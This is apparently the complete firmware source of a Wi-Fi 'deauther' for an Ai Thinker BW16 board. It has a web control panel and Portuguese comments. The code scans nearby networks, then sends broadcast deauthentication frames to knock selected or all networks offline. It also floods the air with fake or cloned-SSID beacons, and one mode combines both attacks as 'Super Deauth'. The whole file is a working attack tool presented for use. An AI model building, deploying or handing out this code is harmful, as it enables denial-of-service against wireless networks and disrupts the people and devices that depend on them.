#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Beacon Spam active

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "Ai Thinker Bw16-kit";
char *pass = "deauther";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis;
std::vector<int> beacon_flood_wifis; // Vetor para armazenar as redes selecionadas para Beacon Flood
WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool beacon_spam_active = false;
bool use_5ghz = false; // Variável para controlar a frequência (2.4GHz ou 5GHz)
String custom_ssid = ""; // Variável global para armazenar o SSID personalizado
bool deauth_flood_active = false; // Variável para controlar o Deauth Flood
bool beacon_flood_active = false; // Variável para controlar o Beacon Flood
bool deauth_beacon_flood_active = false; // Variável para controlar Deauth + Beacon Flood simultaneamente

#define FRAMES_PER_DEAUTH 5
#define BEACON_INTERVAL 100  // Intervalo entre beacons em milissegundos
#define BATCH_SIZE 99999    // Número de Beacons transmitidos por lote
#define TOTAL_SSIDS 9999999   // Total de SSIDs a serem transmitidos
#define BEACONS_PER_NETWORK 99 // Número de beacons a serem enviados por rede selecionada

// Função para gerar SSIDs aleatórios ou usar o SSID personalizado
String generateSSID(int index) {
  if (custom_ssid != "") {
    return custom_ssid; // Retorna o SSID personalizado
  } else {
    // Gera um SSID aleatório com 8 caracteres
    String randomSSID = "WiFi_";
    for (int i = 0; i < 8; i++) {
      randomSSID += (char)random(65, 91); // Gera letras maiúsculas de A a Z
    }
    return randomSSID;
  }
}

// Função para gerar SSIDs com um "." e um número sequencial
String generateFloodSSID(String original_ssid, int sequence) {
  return original_ssid + "." + String(sequence);
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value}); // Add the key-value pair to the vector
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }

    return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>pieteks-deauther</title>
      <style>
          body {
              font-family: Arial, sans-serif;
              line-height: 1.6;
              color: #333;
              max-width: 800px;
              margin: 0 auto;
              padding: 20px;
              background-color: #f4f4f4;
          } 
          h1, h2 {
              color: #2c3e50;
          }
          table {
              width: 100%;
              border-collapse: collapse;
              margin-bottom: 20px;
          }
          th, td {
              padding: 12px;
              text-align: left;
              border-bottom: 1px solid #ddd;
          }
          th {
              background-color: #3498db;
              color: white;
          }
          tr:nth-child(even) {
              background-color: #f2f2f2;
          }
          form {
              background-color: white;
              padding: 20px;
              border-radius: 5px;
              box-shadow: 0 2px 5px rgba(0,0,0,0.1);
              margin-bottom: 20px;
          }
          input[type="submit"] {
              padding: 10px 20px;
              border: none;
              background-color: #3498db;
              color: white;
              border-radius: 4px;
              cursor: pointer;
              transition: background-color 0.3s;
          }
          input[type="submit"]:hover {
              background-color: #2980b9;
          }
          .button-container {
              display: flex;
              gap: 10px;
              margin-bottom: 20px;
          }
          .info-header {
              color: #3498db;
              font-size: 24px;
              font-weight: bold;
              margin-bottom: 10px;
          }
          .info-text {
              margin-bottom: 20px;
          }
          .deauth-flood {
              background-color: #ff0000 !important;
          }
      </style>
  </head>
  <body>
      <h1>pieteks-deauther</h1>

      <h2>WiFi Networks</h2>
      <form method="post" action="/deauth">
          <table>
              <tr>
                  <th>Select</th>
                  <th>Number</th>
                  <th>SSID</th>
                  <th>BSSID</th>
                  <th>Channel</th>
                  <th>RSSI</th>
                  <th>Frequency</th>
              </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<tr>";
    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
    response += "<td>" + String(i) + "</td>";
    response += "<td>" + scan_results[i].ssid + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "</tr>";
  }

  response += R"(
        </table>
        <div class="button-container">
            <input type="submit" value="Deauth">
            <input type="submit" formaction="/deauth_flood" value="Deauth Flood❗" class="deauth-flood">
            <input type="submit" formaction="/beacon_flood" value="Beacon Flood">
            <input type="submit" formaction="/deauth_beacon_flood" value="Super Deauth🔥">
        </div>
      </form>

      <form method="post" action="/rescan">
          <input type="submit" value="Rescan networks">
      </form>

      <form method="post" action="/beacon_spam">
          <p>Banda de Frequencia:</p>
          <select name="Frequency">
              <option value="2.4">2.4GHz</option>
              <option value="5">5GHz</option>
          </select>
          <p>SSID Aleatorios:</p>
          <input type="submit" value="Beacon Spam">
      </form>

      <form method="post" action="/stop_beacon_spam">
          <input type="submit" value="Stop Beacon Spam">
      </form>

      <div class="info-header">INFORMAÇÕES DE USO</div>
      <div class="info-text">
          <p>-Beacon Spam irá gerar redes Wi-Fi aleatórias.</p>
          <p>-Deauth irá derrubar as redes selecionadas.</p>
          <p>-Selecione a frequência do Beacon Spam (5GHz ou 2.4GHz).</p>
          <p>-Deauth Flood irá derrubar todas as redes encontradas (performace reduzida consequentemente).</p>
          <p>-Beacon Flood irá gerar beacons das redes selecionadas com um número sequencial após o "."</p>
          <p>-Super Deauth🔥 e uma versao aprimorada do deauth normal com muito mais potencia.</p>
      </div>
  </body>
  </html>
  )";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks()) {
    delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  digitalWrite(LED_R, HIGH);
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    while (client.available()) {
      while (client.available()) request += (char)client.read();
      delay(1);
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      while (scanNetworks()) {
        delay(1000);
      }
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      if (post_data.size() >= 2) {
        for (auto &param : post_data) {
          if (param.first == "network") {
            deauth_wifis.push_back(String(param.second).toInt());
          } else if (param.first == "reason") {
            deauth_reason = String(param.second).toInt();
          }
        }
      }
    } else if (path == "/beacon_spam") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      custom_ssid = ""; // Reseta o SSID personalizado
      for (auto &param : post_data) {
        if (param.first == "Frequency") {
          use_5ghz = (param.second == "5"); // Define se será 5GHz ou 2.4GHz
        } else if (param.first == "SSID Name") {
          custom_ssid = param.second; // Armazena o SSID personalizado
        }
      }
      beacon_spam_active = true;
      client.write(makeRedirect("/").c_str());
    } else if (path == "/stop_beacon_spam") {
      beacon_spam_active = false;
      client.write(makeRedirect("/").c_str());
    } else if (path == "/deauth_flood") {
      deauth_flood_active = true;
      client.write(makeRedirect("/").c_str());
    } else if (path == "/beacon_flood") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      beacon_flood_wifis.clear(); // Limpa a lista de redes selecionadas
      for (auto &param : post_data) {
        if (param.first == "network") {
          beacon_flood_wifis.push_back(String(param.second).toInt()); // Adiciona as redes selecionadas
        }
      }
      beacon_flood_active = true;
      client.write(makeRedirect("/").c_str());
    } else if (path == "/deauth_beacon_flood") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      deauth_wifis.clear(); // Limpa a lista de redes selecionadas
      beacon_flood_wifis.clear(); // Limpa a lista de redes selecionadas
      for (auto &param : post_data) {
        if (param.first == "network") {
          deauth_wifis.push_back(String(param.second).toInt()); // Adiciona as redes selecionadas
          beacon_flood_wifis.push_back(String(param.second).toInt()); // Adiciona as redes selecionadas
        }
      }
      deauth_beacon_flood_active = true;
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    digitalWrite(LED_G, LOW);
  }
  
  uint32_t current_num = 0;
  while (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;
    digitalWrite(LED_B, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_B, LOW);
    delay(50);
  }

  if (deauth_flood_active) {
    digitalWrite(LED_B, HIGH);
    for (uint32_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int j = 0; j < FRAMES_PER_DEAUTH; j++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        delay(5);
      }
    }
    digitalWrite(LED_B, LOW);
    delay(50);
  }

  if (beacon_spam_active) {
    digitalWrite(LED_B, HIGH);
    for (int i = 0; i < TOTAL_SSIDS; i += BATCH_SIZE) {
      for (int j = 0; j < BATCH_SIZE && (i + j) < TOTAL_SSIDS; j++) {
        uint8_t src_mac[6] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
        uint8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        // Define o canal com base na frequência selecionada
        int channel = use_5ghz ? random(36, 165) : random(1, 14);
        wext_set_channel(WLAN0_NAME, channel);
        wifi_tx_beacon_frame(src_mac, dst_mac, generateSSID(i + j).c_str());
      }
      delay(BEACON_INTERVAL); // Intervalo entre lotes de Beacons
    }
  } else {
    digitalWrite(LED_B, LOW);
  }

  if (beacon_flood_active) {
    digitalWrite(LED_B, HIGH);
    for (uint32_t i = 0; i < beacon_flood_wifis.size(); i++) {
      int index = beacon_flood_wifis[i];
      wext_set_channel(WLAN0_NAME, scan_results[index].channel);
      uint8_t src_mac[6] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
      uint8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      for (int j = 0; j < BEACONS_PER_NETWORK; j++) {
        wifi_tx_beacon_frame(src_mac, dst_mac, generateFloodSSID(scan_results[index].ssid, j + 1).c_str());
        delay(BEACON_INTERVAL);
      }
    }
    digitalWrite(LED_B, LOW);
  }

  if (deauth_beacon_flood_active) {
    digitalWrite(LED_B, HIGH);
    for (uint32_t i = 0; i < deauth_wifis.size(); i++) {
      int index = deauth_wifis[i];
      memcpy(deauth_bssid, scan_results[index].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[index].channel);

      // Executa o Beacon Flood primeiro para garantir que os beacons sejam visíveis
      uint8_t src_mac[6] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
      uint8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      for (int j = 0; j < BEACONS_PER_NETWORK; j++) {
        wifi_tx_beacon_frame(src_mac, dst_mac, generateFloodSSID(scan_results[index].ssid, j + 1).c_str());
        delay(BEACON_INTERVAL);
      }

      // Executa o Deauth
      for (int j = 0; j < FRAMES_PER_DEAUTH; j++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        delay(5);
      }
    }
    digitalWrite(LED_B, LOW);
  }
}